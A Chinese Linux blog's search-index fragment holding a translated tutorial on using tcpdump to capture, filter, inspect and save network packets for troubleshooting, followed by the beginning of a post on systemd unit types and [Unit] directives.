09:56:18.335569 IP gateway.domain \u003e rhel75.56631: 29904 NXDomain* 0/1/0 (103) 09:56:18.336429 IP rhel75.44007 \u003e gateway.domain: 61677+ PTR? 98.122.168.192.in-addr.arpa. (45) 09:56:18.336655 IP gateway.domain \u003e rhel75.44007: 61677* 1/0/0 PTR rhel75. (65) 09:56:18.337177 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 584:1644, ack 1, win 309, options [nop,nop,TS val 76577942 ecr 510771047], length 1060 ---- SKIPPING LONG OUTPUT ----- 09:56:19.342939 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 1752016, win 1444, options [nop,nop,TS val 510772067 ecr 76578948], length 0 ^C 9003 packets captured 9010 packets received by filter 7 packets dropped by kernel $\u003e Tcpdump继续捕获数据包，直到它接收到中断信号。您可以按Ctrl+C中断捕获。在这个例子中可以看到，tcpdump捕获了超过9,000个包。在本例中，由于我使用ssh连接到此服务器，所以tcpdump捕获了所有这些包。若要限制捕获的数据包数量并停止tcpdump，请使用-c选项: $\u003e sudo tcpdump -i any -c 5 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 11:21:30.242740 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3772575680:3772575876, ack 3503651743, win 309, options [nop,nop,TS val 81689848 ecr 515883153], length 196 11:21:30.242906 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 1443, options [nop,nop,TS val 515883235 ecr 81689848], length 0 11:21:30.244442 IP rhel75.43634 \u003e gateway.domain: 57680+ PTR? 1.64.168.192.in-addr.arpa. (43) 11:21:30.244829 IP gateway.domain \u003e rhel75.43634: 57680 NXDomain 0/0/0 (43) 11:21:30.247048 IP rhel75.33696 \u003e gateway.domain: 37429+ PTR? 28.64.168.192.in-addr.arpa. (44) 5 packets captured 12 packets received by filter 0 packets dropped by kernel $\u003e 在本例中，tcpdump在捕获5个包之后自动停止捕获。这在不同的场景中都很有用——例如，如果您正在对连接进行故障诊断，并且捕获几个初始包就足够了。当我们应用过滤器来捕获特定的包时，这甚至更有用(如下所示)。 默认情况下，tcpdump将IP地址和端口解析为名称，如前面的示例所示。在排除网络问题时，通常更容易使用IP地址和端口号; 禁用名称解析使用选项-n和端口解析与-nn: $\u003e sudo tcpdump -i any -c5 -nn tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 23:56:24.292206 IP 192.168.64.28.22 \u003e 192.168.64.1.35110: Flags [P.], seq 166198580:166198776, ack 2414541257, win 309, options [nop,nop,TS val 615664 ecr 540031155], length 196 23:56:24.292357 IP 192.168.64.1.35110 \u003e 192.168.64.28.22: Flags [.], ack 196, win 1377, options [nop,nop,TS val 540031229 ecr 615664], length 0 23:56:24.292570 IP 192.","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:2:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"3. 理解输出格式 Tcpdump能够捕获和解码许多不同的协议，比如TCP、UDP、ICMP等等。虽然我们不能在这里全部介绍，但是为了帮助您入门，让我们研究一下TCP包。您可以在tcpdump的手册页中找到关于不同协议格式的更多细节。tcpdump捕获的典型TCP包是这样的: 08:41:13.729687 IP 192.168.64.28.22 \u003e 192.168.64.1.41916: Flags [P.], seq 196:568, ack 1, win 309, options [nop,nop,TS val 117964079 ecr 816509256], length 372 字段可能因发送的包的类型而异，但这是一般格式。 第一个字段08:41:13.729687表示根据本地时钟接收到的数据包的时间戳。 接下来，IP表示网络层协议——在本例中是IPv4。对于IPv6数据包，值是IP6。 下一个字段192.168.64.28.22是源IP地址和端口。然后是目标IP地址和端口，由192.168.64.1.41916表示。 在源和目标之后，您可以找到TCP标志标志[P.]。该字段的典型值包括: 值 标志类型 描述 S SYN Connection Start F FIN Connection Finish P PUSH Data push R RST Connection reset . ACK Acknowledgment This field can also be a combination of these values, such as [S.] for a SYN-ACK pack The next field is the window size win 309, which represents the number of bytes available in the receiving buffer, followed by TCP options such as the MSS (Maximum Segment Size) or Window Scale. For details about TCP protocol options, consult Transmission Control Protocol (TCP) Parameters. Finally, we have the packet length, length 372, which represents the length, in bytes, of the payload data. The length is the difference between the last and first bytes in the sequence number. Now let’s learn how to filter packets to narrow down results and make it easier to troubleshoot specific issues. 该字段也可以是这些值的组合，例如用于SYN-ACK分组的[S.]。 接下来是数据包中包含的数据的序列号。对于捕获的第一个包，这是一个绝对值。随后的数据包使用一个相对号，以便更容易跟踪。在这个例子中，序列是seq 196:568，这意味着这个包包含这个流的196到568字节。 然后是Ack编号:Ack 1。在本例中，它是1，因为这是发送数据的一方。对于接收数据的端，此字段表示此流上的下一个预期字节(数据)。例如，这个流中的下一个包的Ack号将是568。 下一个字段是窗口大小win 309，它表示接收缓冲区中可用的字节数，然后是TCP选项，如MSS(最大段大小)或窗口大小。有关TCP协议选项的详细信息，请参阅传输控制协议(TCP)参数。 最后，我们有数据包长度，长度372，它表示负载数据的长度，以字节为单位。长度是序号中最后一个字节和第一个字节之间的差。 现在，让我们学习如何过滤数据包以缩小结果范围，并使特定问题的故障排除变得更容易。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:3:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"4. 过滤数据包 如上所述，tcpdump可以捕获太多包，其中一些包甚至与您正在排除的问题无关。例如，如果您正在排除与web服务器的连接问题，而您对SSH流量不感兴趣，因此从输出中删除SSH数据包可以更容易地处理真正的问题。 tcpdump最强大的特性之一是它能够使用各种参数(如源和目标IP地址、端口、协议等)过滤捕获的数据包。让我们来看看一些最常见的。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:4:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"4.1. Protocol 要基于协议过滤数据包，请在命令行中指定协议。例如，使用以下命令用于捕获ICMP数据包: $\u003e sudo tcpdump -i any -c5 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 在另一个终端，尝试ping另一台机器: $\u003e ping opensource.com PING opensource.com (54.204.39.132) 56(84) bytes of data. 64 bytes from ec2-54-204-39-132.compute-1.amazonaws.com (54.204.39.132): icmp_seq=1 ttl=47 time=39.6 ms 回到tcpdump捕获中，注意tcpdump只捕获和显示与icmp相关的包。在这种情况下，tcpdump不显示解析opensource.com时生成的名称解析包: 09:34:20.136766 IP rhel75 \u003e ec2-54-204-39-132.compute-1.amazonaws.com: ICMP echo request, id 20361, seq 1, length 64 09:34:20.176402 IP ec2-54-204-39-132.compute-1.amazonaws.com \u003e rhel75: ICMP echo reply, id 20361, seq 1, length 64 09:34:21.140230 IP rhel75 \u003e ec2-54-204-39-132.compute-1.amazonaws.com: ICMP echo request, id 20361, seq 2, length 64 09:34:21.180020 IP ec2-54-204-39-132.compute-1.amazonaws.com \u003e rhel75: ICMP echo reply, id 20361, seq 2, length 64 09:34:22.141777 IP rhel75 \u003e ec2-54-204-39-132.compute-1.amazonaws.com: ICMP echo request, id 20361, seq 3, length 64 5 packets captured 5 packets received by filter 0 packets dropped by kernel ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:5:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"4.2. Host 使用主机过滤器将捕获限制为只与特定主机相关的数据包: $\u003e sudo tcpdump -i any -c5 -nn host 54.204.39.132 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 09:54:20.042023 IP 192.168.122.98.39326 \u003e 54.204.39.132.80: Flags [S], seq 1375157070, win 29200, options [mss 1460,sackOK,TS val 122350391 ecr 0,nop,wscale 7], length 0 09:54:20.088127 IP 54.204.39.132.80 \u003e 192.168.122.98.39326: Flags [S.], seq 1935542841, ack 1375157071, win 28960, options [mss 1460,sackOK,TS val 522713542 ecr 122350391,nop,wscale 9], length 0 09:54:20.088204 IP 192.168.122.98.39326 \u003e 54.204.39.132.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 122350437 ecr 522713542], length 0 09:54:20.088734 IP 192.168.122.98.39326 \u003e 54.204.39.132.80: Flags [P.], seq 1:113, ack 1, win 229, options [nop,nop,TS val 122350438 ecr 522713542], length 112: HTTP: GET / HTTP/1.1 09:54:20.129733 IP 54.204.39.132.80 \u003e 192.168.122.98.39326: Flags [.], ack 113, win 57, options [nop,nop,TS val 522713552 ecr 122350438], length 0 5 packets captured 5 packets received by filter 0 packets dropped by kernel 在此实例中，tcpdump只捕获和显示主机54.204.39.132之间的数据包 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:6:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"4.3. Port 要根据所需的服务或端口过滤数据包，请使用端口过滤器。例如，使用以下命令捕获与web (HTTP)服务相关的数据包:　$\u003e sudo tcpdump -i any -c5 -nn port 80 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 09:58:28.790548 IP 192.168.122.98.39330 \u003e 54.204.39.132.80: Flags [S], seq 1745665159, win 29200, options [mss 1460,sackOK,TS val 122599140 ecr 0,nop,wscale 7], length 0 09:58:28.834026 IP 54.204.39.132.80 \u003e 192.168.122.98.39330: Flags [S.], seq 4063583040, ack 1745665160, win 28960, options [mss 1460,sackOK,TS val 522775728 ecr 122599140,nop,wscale 9], length 0 09:58:28.834093 IP 192.168.122.98.39330 \u003e 54.204.39.132.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 122599183 ecr 522775728], length 0 09:58:28.834588 IP 192.168.122.98.39330 \u003e 54.204.39.132.80: Flags [P.], seq 1:113, ack 1, win 229, options [nop,nop,TS val 122599184 ecr 522775728], length 112: HTTP: GET / HTTP/1.1 09:58:28.878445 IP 54.204.39.132.80 \u003e 192.168.122.98.39330: Flags [.], ack 113, win 57, options [nop,nop,TS val 522775739 ecr 122599184], length 0 5 packets captured 5 packets received by filter 0 packets dropped by kernel Source IP/hostname 你还可以根据源或目标IP地址或主机名过滤数据包。例如，从主机192.168.122.98捕获数据包: $\u003e sudo tcpdump -i any -c5 -nn src 192.168.122.98 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 10:02:15.220824 IP 192.168.122.98.39436 \u003e 192.168.122.1.53: 59332+ A? opensource.com. (32) 10:02:15.220862 IP 192.168.122.98.39436 \u003e 192.168.122.1.53: 20749+ AAAA? opensource.com. (32) 10:02:15.364062 IP 192.168.122.98.39334 \u003e 54.204.39.132.80: Flags [S], seq 1108640533, win 29200, options [mss 1460,sackOK,TS val 122825713 ecr 0,nop,wscale 7], length 0 10:02:15.409229 IP 192.168.122.98.39334 \u003e 54.204.39.132.80: Flags [.], ack 669337581, win 229, options [nop,nop,TS val 122825758 ecr 522832372], length 0 10:02:15.409667 IP 192.168.122.98.39334 \u003e 54.204.39.132.80: Flags [P.], seq 0:112, ack 1, win 229, options [nop,nop,TS val 122825759 ecr 522832372], length 112: HTTP: GET / HTTP/1.1 5 packets captured 5 packets received by filter 0 packets dropped by kernel 注意，tcpdump捕获的数据包的源IP地址为192.168.122.98，用于多个服务，比如名称解析(端口53)和HTTP(端口80)。响应包不显示，因为它们的源IP不同。 相反，您可以使用dst过滤器按目标IP/主机名进行过滤： $\u003e sudo tcpdump -i any -c5 -nn dst 192.168.122.98 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 10:05:03.572931 IP 192.168.122.1.53 \u003e 192.168.122.98.47049: 2248 1/0/0 A 54.204.39.132 (48) 10:05:03.572944 IP 192.168.122.1.53 \u003e 192.168.122.98.47049: 33770 0/0/0 (32) 10:05:03.621833 IP 54.204.39.132.80 \u003e 192.168.122.98.39338: Flags [S.], seq 3474204576, ack 3256851264, win 28960, options [mss 1460,sackOK,TS val 522874425 ecr 122993922,nop,wscale 9], length 0 10:05:03.667767 IP 54.204.39.132.80 \u003e 192.168.122.98.39338: Flags [.], ack 113, win 57, options [nop,nop,TS val 522874436 ecr 122993972], length 0 10:05:03.672221 IP 54.204.39.132.80 \u003e 192.168.122.98.39338: Flags [P.], seq 1:643, ack 113, win 57, options [nop,nop,TS val 522874437 ecr 122993972], length 642: HTTP: HTTP/1.1 302 Found 5 packets captured 5 packets received by filter 0 packets dropped by kernel Complex expressions 您还可以通过使用逻辑运算符和and或创建更复杂的表达式来组合过滤器。例如，要从源IP地址192.168.122.98和服务HTTP中过滤数据包，请使用以下命令: $\u003e sudo tcpdump -i any -c5 -nn src 192.168.122.98 and port 80 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 10:08:00.472696 IP 192.168.122.98.39342 \u003e 54.204.39.132.80: Flags [S], seq 2712685325, win 29200, options [mss 1460,sackOK,TS val 123170822 ecr 0,nop,wscale 7], length 0 10:08:00.516118 IP 192.168.122.98.39342 \u003e 54.204.39.132.80: Flags [.], ack 268723504, win 229, options [nop,nop,TS val 123170865 ecr 522918648], length 0 10:08:00.516583 IP 192.168.122.98.39342 \u003e ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:7:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"5. 检查数据包的内容 在前面的示例中，我们只检查信息包的头信息，如源、目标、端口等。有时，这就是我们解决网络连接问题所需要的全部内容。然而，有时我们需要检查包的内容，以确保我们发送的消息包含我们需要的内容，或者我们收到了预期的响应。要查看包内容，tcpdump提供了两个附加标志:-X以十六进制打印内容，ASCII或-A以ASCII打印内容。 例如，检查Web请求的HTTP内容，如下所示： $\u003e sudo tcpdump -i any -c10 -nn -A port 80 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 13:02:14.871803 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [S], seq 2546602048, win 29200, options [mss 1460,sackOK,TS val 133625221 ecr 0,nop,wscale 7], length 0 E..\u003c..@.@.....zb6.'....P...@......r............ ............................ 13:02:14.910734 IP 54.204.39.132.80 \u003e 192.168.122.98.39366: Flags [S.], seq 1877348646, ack 2546602049, win 28960, options [mss 1460,sackOK,TS val 525532247 ecr 133625221,nop,wscale 9], length 0 E..\u003c..@./..a6.'...zb.P..o..\u0026...A..q a.......... .R.W....... ................ 13:02:14.910832 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 133625260 ecr 525532247], length 0 E..4..@.@.....zb6.'....P...Ao..'........... .....R.W................ 13:02:14.911808 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [P.], seq 1:113, ack 1, win 229, options [nop,nop,TS val 133625261 ecr 525532247], length 112: HTTP: GET / HTTP/1.1 E.....@.@..1..zb6.'....P...Ao..'........... .....R.WGET / HTTP/1.1 User-Agent: Wget/1.14 (linux-gnu) Accept: */* Host: opensource.com Connection: Keep-Alive ................ 13:02:14.951199 IP 54.204.39.132.80 \u003e 192.168.122.98.39366: Flags [.], ack 113, win 57, options [nop,nop,TS val 525532257 ecr 133625261], length 0 E..4.F@./..\"6.'...zb.P..o..'.......9.2..... .R.a.................... 13:02:14.955030 IP 54.204.39.132.80 \u003e 192.168.122.98.39366: Flags [P.], seq 1:643, ack 113, win 57, options [nop,nop,TS val 525532258 ecr 133625261], length 642: HTTP: HTTP/1.1 302 Found E....G@./...6.'...zb.P..o..'.......9....... .R.b....HTTP/1.1 302 Found Server: nginx Date: Sun, 23 Sep 2018 17:02:14 GMT Content-Type: text/html; charset=iso-8859-1 Content-Length: 207 X-Content-Type-Options: nosniff Location: https://opensource.com/ Cache-Control: max-age=1209600 Expires: Sun, 07 Oct 2018 17:02:14 GMT X-Request-ID: v-6baa3acc-bf52-11e8-9195-22000ab8cf2d X-Varnish: 632951979 Age: 0 Via: 1.1 varnish (Varnish/5.2) X-Cache: MISS Connection: keep-alive \u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e \u003chtml\u003e\u003chead\u003e \u003ctitle\u003e302 Found\u003c/title\u003e \u003c/head\u003e\u003cbody\u003e \u003ch1\u003eFound\u003c/h1\u003e \u003cp\u003eThe document has moved \u003ca href=\"https://opensource.com/\"\u003ehere\u003c/a\u003e.\u003c/p\u003e \u003c/body\u003e\u003c/html\u003e ................ 13:02:14.955083 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [.], ack 643, win 239, options [nop,nop,TS val 133625304 ecr 525532258], length 0 E..4..@.@.....zb6.'....P....o.............. .....R.b................ 13:02:15.195524 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [F.], seq 113, ack 643, win 239, options [nop,nop,TS val 133625545 ecr 525532258], length 0 E..4..@.@.....zb6.'....P....o.............. .....R.b................ 13:02:15.236592 IP 54.204.39.132.80 \u003e 192.168.122.98.39366: Flags [F.], seq 643, ack 114, win 57, options [nop,nop,TS val 525532329 ecr 133625545], length 0 E..4.H@./.. 6.'...zb.P..o..........9.I..... .R...................... 13:02:15.236656 IP 192.168.122.98.39366 \u003e 54.204.39.132.80: Flags [.], ack 644, win 239, options [nop,nop,TS val 133625586 ecr 525532329], length 0 E..4..@.@.....zb6.'....P....o.............. .....R.................. 10 packets captured 10 packets received by filter 0 packets dropped by kernel 假设调用使用普通HTTP，这对于解决API调用的问题很有帮助。对于加密连接，这个输出就不那么有用了。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:8:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"6. 将捕获保存到文件 tcpdump提供的另一个有用特性是能够将捕获保存到文件中，以便稍后分析结果。例如，这允许您在夜间以批处理模式捕获数据包，并在早晨验证结果。当有太多包需要分析时，它也会有帮助，因为实时捕获可能发生得太快。 要将数据包保存到文件中，而不是显示在屏幕上，请使用选项-w: $\u003e sudo tcpdump -i any -c10 -nn -w webserver.pcap port 80 [sudo] password for ricardo: tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 10 packets captured 10 packets received by filter 0 packets dropped by kernel 这个命令将输出保存在一个名为webserver.pcap的文件中。pcap扩展名代表“包捕获”，是这种文件格式的约定。 如本例所示，屏幕上没有显示任何内容，捕获在捕获10个包之后完成，这与选项-c10相同。如果您想要一些反馈以确保正在捕获数据包，请使用选项-v。 Tcpdump创建二进制格式的文件，因此不能简单地使用文本编辑器打开它。要读取文件内容，请使用-r选项执行tcpdump: $\u003e tcpdump -nn -r webserver.pcap reading from file webserver.pcap, link-type LINUX_SLL (Linux cooked) 13:36:57.679494 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [S], seq 3709732619, win 29200, options [mss 1460,sackOK,TS val 135708029 ecr 0,nop,wscale 7], length 0 13:36:57.718932 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [S.], seq 1999298316, ack 3709732620, win 28960, options [mss 1460,sackOK,TS val 526052949 ecr 135708029,nop,wscale 9], length 0 13:36:57.719005 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 135708068 ecr 526052949], length 0 13:36:57.719186 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [P.], seq 1:113, ack 1, win 229, options [nop,nop,TS val 135708068 ecr 526052949], length 112: HTTP: GET / HTTP/1.1 13:36:57.756979 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [.], ack 113, win 57, options [nop,nop,TS val 526052959 ecr 135708068], length 0 13:36:57.760122 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [P.], seq 1:643, ack 113, win 57, options [nop,nop,TS val 526052959 ecr 135708068], length 642: HTTP: HTTP/1.1 302 Found 13:36:57.760182 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [.], ack 643, win 239, options [nop,nop,TS val 135708109 ecr 526052959], length 0 13:36:57.977602 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [F.], seq 113, ack 643, win 239, options [nop,nop,TS val 135708327 ecr 526052959], length 0 13:36:58.022089 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [F.], seq 643, ack 114, win 57, options [nop,nop,TS val 526053025 ecr 135708327], length 0 13:36:58.022132 IP 192.168.122.98.39378 \u003e 54.204.39.132.80: Flags [.], ack 644, win 239, options [nop,nop,TS val 135708371 ecr 526053025], length 0 $\u003e 由于不再直接从网络接口捕获数据包，所以不需要sudo来读取文件。 您还可以使用我们讨论过的任何过滤器来过滤文件中的内容，就像处理实时数据一样。例如，执行以下命令检查源IP地址54.204.39.132的捕获文件中的数据包: $\u003e tcpdump -nn -r webserver.pcap src 54.204.39.132 reading from file webserver.pcap, link-type LINUX_SLL (Linux cooked) 13:36:57.718932 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [S.], seq 1999298316, ack 3709732620, win 28960, options [mss 1460,sackOK,TS val 526052949 ecr 135708029,nop,wscale 9], length 0 13:36:57.756979 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [.], ack 113, win 57, options [nop,nop,TS val 526052959 ecr 135708068], length 0 13:36:57.760122 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [P.], seq 1:643, ack 113, win 57, options [nop,nop,TS val 526052959 ecr 135708068], length 642: HTTP: HTTP/1.1 302 Found 13:36:58.022089 IP 54.204.39.132.80 \u003e 192.168.122.98.39378: Flags [F.], seq 643, ack 114, win 57, options [nop,nop,TS val 526053025 ecr 135708327], length 0 next ? tcpdump的这些基本特性将帮助您开始使用这个功能强大的通用工具。要了解更多信息，请访问tcpdump网站和man页面。 tcpdump命令行接口为捕获和分析网络流量提供了很大的灵活性。如果您需要图形化工具来理解更复杂的流，请查看Wireshark。 Wireshark的一个优点是它可以读取tcpdump捕获的.pcap文件。您可以使用tcpdump在没有GUI的远程机器中捕获数据包，并使用Wireshark分析结果文件，但这是另一个主题。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:9:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","那些有用没用的"],"content":"Systemctl之systemd自定义系统服务","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html http://www.ruanyifeng.com/blog/2018/03/systemd-timer.html ","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:0:0","tags":["linux","优化","systemd","解决方案"],"title":"Systemctl之systemd自定义系统服务","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","那些有用没用的"],"content":"1. [Unit] Unit 定义启动顺序与依赖关系 单元(Unit)是 Systemd 的最小功能单位，是单个进程的描述。一个个小的单元互相调用和依赖，组成一个庞大的任务管理系统 其他的单元类型 https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files Systemd 根据他们描述的资源类型对单位进行分类。确定单元类型的最简单方法是使用其类型后缀，该后缀附加到资源名称的末尾。 以下列表描述了可用于以下各项的单位类型systemd: .service: 服务单元描述如何管理服务器上的服务或应用程序。这将包括如何启动或停止服务，应在何种情况下自动启动服务，以及相关软件的依赖关系和订购信息。 .socket: 套接字单元文件描述网络或IPC套接字，或systemd用于基于套接字的激活的FIFO缓冲区。这些.service文件始终具有一个关联文件，该文件将在本单元定义的套接字上看到活动时启动。 .device: 描述已被指定为需要systemd管理的设备udev或sysfs文件系统的单元。并非所有设备都有.device文件。.device可能需要单元的一些场景是用于订购，安装和访问设备。 .mount: 此单元定义要由其管理的系统上的挂载点systemd。这些以安装路径命名，斜杠更改为破折号。其中的条目/etc/fstab可以自动创建单位。 .automount: 一个.automount单元配置将自动挂载的挂载点。这些必须以它们引用的挂载点命名，并且必须具有匹配.mount单元以定义挂载的细节。 .swap: 此单元描述系统上的交换空间。这些单元的名称必须反映空间的设备或文件路径。 .target: 目标单元用于在启动或更改状态时为其他单元提供同步点。它们还可用于使系统进入新状态。其他单位指定它们与目标的关系以与目标的操作联系起来。 .path: 此单元定义可用于基于路径的激活的路径。默认情况下，.service当路径达到指定状态时，将启动相同基本名称的单元。这用于inotify监视更改的路径。 .timer: .timer单元定义将由其管理的计时器systemd，类似于cron延迟或计划激活的作业。达到计时器时将启动匹配单元。 .snapshot: 命令.snapshot自动创建一个单元systemctl snapshot。它允许您在进行更改后重建系统的当前状态。快照不会跨会话生存，并用于回滚临时状态。 .slice: .slice单元与Linux控制组节点关联，允许限制资源或将资源分配给与该片关联的任何进程。该名称反映了它在cgroup树中的层次结构位置。默认情况下，单位会根据其类型放置在某些切片中。 .scope: 范围单元systemd由从其总线接口接收的信息自动创建。这些用于管理外部创建的系统进程集。 Description=当前服务的描述 Documentation=给出文档的位置,一般就是服务启动命令的帮助文档 After=表示如果此字段标记的服务若需要启动,那么当前定义的服务需要在此标记服务器启动之后. Before=表示如果此字段标记的服务若需要启动,那么当前定义的服务需要在此标记服务器启动之前. Wants=表示此字段标记的服务与当前定义服务存在\"弱依赖\"关系,即表示当前定义的节点服务启动失败或者停止运行,不影响当前定义的服务继续执行. Requires=表示此字段标记的服务与当前定义服务存在\"强依赖\"关系,即表示当前定义的节点服务启动失败或者停止运行,那么当前定义的服务也必须停止. 